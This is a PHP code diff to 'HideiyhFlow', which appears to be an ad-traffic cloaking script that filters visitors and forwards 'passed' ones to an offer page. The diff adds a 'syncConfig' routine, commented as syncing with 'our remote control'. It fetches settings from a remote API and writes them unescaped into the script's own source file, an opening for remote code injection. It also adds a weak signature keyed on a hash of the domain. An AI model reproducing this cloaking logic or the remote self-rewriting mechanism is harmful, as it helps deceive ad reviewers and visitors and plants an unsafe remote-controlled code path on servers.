@@ -228,6 +228,18 @@ class HideiyhFlow
         $url = self::$API_BASE_URL . '/blocker?' . http_build_query($params);
         return self::request($url);
     }
+    public static function signature($offer_url)
+    {
+        $parseUrl = parse_url($offer_url);
+        $domain = $parseUrl['host'] ?? '';
+
+        if ($domain == '') {
+            exit('Offer URL tidak valid untuk menggunakan fitur signature.');
+        }
+        $password = sha1($domain);
+
+        return hash_hmac('sha256', $domain, $password);
+    }
     public static function renderPage($url, $method)
     {
         $method = strtolower(trim((string)$method));
@@ -314,8 +326,59 @@ class HideiyhFlow
         self::request($url, 'POST', $data);
     }
 
+    public static function syncConfig()
+    {
+        // Path to store our cache timestamp locally
+        $cacheFile = __DIR__ . '/.hideiyh_sync_cache';
+        $cacheTtl = 300; // 5 minutes cache
+
+        // Return early if we checked recently
+        if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < $cacheTtl) {
+            return;
+        }
+
+        $currentConfig = CONFIG;
+        $currentHash = md5(json_encode($currentConfig));
+
+        $url = self::$API_BASE_URL . '/load-config/' . CONFIG['uniqid'];
+        $response = self::request($url);
+
+        // Update cache timestamp regardless of success so we don't spam if API is down
+        file_put_contents($cacheFile, time());
+
+        if (isset($response['success']) && $response['success'] === true) {
+            $remoteHash = $response['hash'];
+            if ($currentHash !== $remoteHash && isset($response['config'])) {
+                $newConfig = $response['config'];
+                $file = __FILE__;
+                $content = file_get_contents($file);
+
+                // We carefully replace the array values within the template based on their keys
+                foreach ($newConfig as $key => $value) {
+                    // Match the specific $CONFIG['key'] = 'value'; lines and replace them
+                    $pattern = "/(\\\$CONFIG\\['" . preg_quote($key, '/') . "'\\]\\s*=\\s*')[^']*(';)/";
+                    $content = preg_replace($pattern, '${1}' . $value . '${2}', $content);
+                }
+
+                // Write the newly embedded config to disk
+                file_put_contents($file, $content);
+
+                // Once regenerated, we must stop the current run to let the new file take effect
+                // and issue a silent redirect back to the exact same URL to reload context
+                $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
+                $domainName = $_SERVER['HTTP_HOST'];
+                $requestUri = $_SERVER['REQUEST_URI'];
+                header("Location: " . $protocol . $domainName . $requestUri);
+                exit;
+            }
+        }
+    }
+
     public static function run()
     {
+        // First thing, ensure we're running entirely synchronized with our remote control
+        self::syncConfig();
+
         $ip = self::ip();
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $referer = $_SERVER['HTTP_REFERER'] ?? '';
@@ -388,7 +451,36 @@ class HideiyhFlow
         }
 
         self::logVisitor('passed', $geo);
-        self::renderPage(CONFIG['offer_page_url'], CONFIG['render_offer_page']);
+
+        $finalUrl = CONFIG['offer_page_url'];
+        $queryString = $_SERVER['QUERY_STRING'] ?? '';
+        $sig = '';
+
+        if (CONFIG['acs'] == '1') {
+            $sig = 'sig=' . self::signature($finalUrl);
+        }
+
+        if (CONFIG['allowed_params'] == '1') {
+            if (!empty($queryString)) {
+                $separator = (parse_url($finalUrl, PHP_URL_QUERY) == NULL) ? '?' : '&';
+                $finalUrl .= $separator . $queryString;
+                if (!empty($sig)) {
+                    $finalUrl .= '&' . $sig;
+                }
+            } else {
+                if (!empty($sig)) {
+                    $separator = (parse_url($finalUrl, PHP_URL_QUERY) == NULL) ? '?' : '&';
+                    $finalUrl .= $separator . $sig;
+                }
+            }
+        } else {
+            if (!empty($sig)) {
+                $separator = (parse_url($finalUrl, PHP_URL_QUERY) == NULL) ? '?' : '&';
+                $finalUrl .= $separator . $sig;
+            }
+        }
+
+        self::renderPage($finalUrl, CONFIG['render_offer_page']);
     }
 }
 
